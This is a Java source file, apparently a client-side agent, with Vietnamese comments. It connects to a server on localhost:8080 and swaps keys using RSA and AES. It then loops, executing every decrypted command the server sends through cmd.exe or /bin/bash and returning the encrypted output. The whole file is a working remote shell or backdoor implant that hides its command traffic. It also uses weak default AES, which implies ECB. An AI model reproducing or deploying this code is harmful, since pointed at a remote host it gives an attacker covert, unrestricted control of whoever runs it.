package com.clientapp.util.implement;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.Socket;
import java.security.*;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;

public class ClientCommand {

    public static void main(String[] args) {
        try (Socket socket = new Socket("localhost", 8080)) {
            DataInputStream input = new DataInputStream(socket.getInputStream());
            DataOutputStream output = new DataOutputStream(socket.getOutputStream());

            // Nhận khóa công khai RSA từ Server
            String rsaPublicKeyString = input.readUTF();
            PublicKey rsaPublicKey = getPublicKeyFromString(rsaPublicKeyString);

            // Tạo khóa AES và mã hóa bằng khóa công khai RSA
            SecretKey aesKey = generateAESKey();
            String encryptedAesKey = encryptAESKey(aesKey, rsaPublicKey);
            output.writeUTF(encryptedAesKey);

            // Nhận lệnh từ Server, chạy lệnh shell và gửi kết quả
            while (true) {
                String encryptedCommand = input.readUTF();
                String command = decryptCommand(encryptedCommand, aesKey);
                if (command.isEmpty()) continue;
                String result = executeShellCommand(command);
                String encryptedResponse = encryptResponse(result, aesKey);
                output.writeUTF(encryptedResponse);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String executeShellCommand(String command) throws IOException {
        if (command.isEmpty()) {
            return "";
        }

        command = command.replaceAll("\0", "");
        System.out.println("Executing command: " + command);

        ProcessBuilder builder;

        // Kiểm tra hệ điều hành hiện tại
        String os = System.getProperty("os.name").toLowerCase();

        if (os.contains("win")) {
            // Sử dụng cmd.exe cho Windows
            builder = new ProcessBuilder("cmd.exe", "/c", command);
        } else {
            // Sử dụng bash cho Unix/Linux
            builder = new ProcessBuilder("/bin/bash", "-c", command);
        }

        builder.redirectErrorStream(true);
        Process process = builder.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder result = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            result.append(line).append("\n");
        }
        return result.toString();
    }


    private static String encryptResponse(String response, SecretKey aesKey) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, aesKey);
        byte[] encrypted = cipher.doFinal(response.getBytes());
        return Base64.getEncoder().encodeToString(encrypted);
    }

    private static String decryptCommand(String encryptedCommand, SecretKey aesKey) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, aesKey);
        byte[] decodedBytes = Base64.getDecoder().decode(encryptedCommand);
        return new String(cipher.doFinal(decodedBytes));
    }

    private static String encryptAESKey(SecretKey aesKey, PublicKey rsaPublicKey) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA");
        cipher.init(Cipher.ENCRYPT_MODE, rsaPublicKey);
        byte[] encryptedKey = cipher.doFinal(aesKey.getEncoded());
        return Base64.getEncoder().encodeToString(encryptedKey);
    }

    private static PublicKey getPublicKeyFromString(String key) throws Exception {
        byte[] byteKey = Base64.getDecoder().decode(key);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        return keyFactory.generatePublic(new X509EncodedKeySpec(byteKey));
    }

    private static SecretKey generateAESKey() throws NoSuchAlgorithmException {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(256);
        return keyGen.generateKey();
    }
}
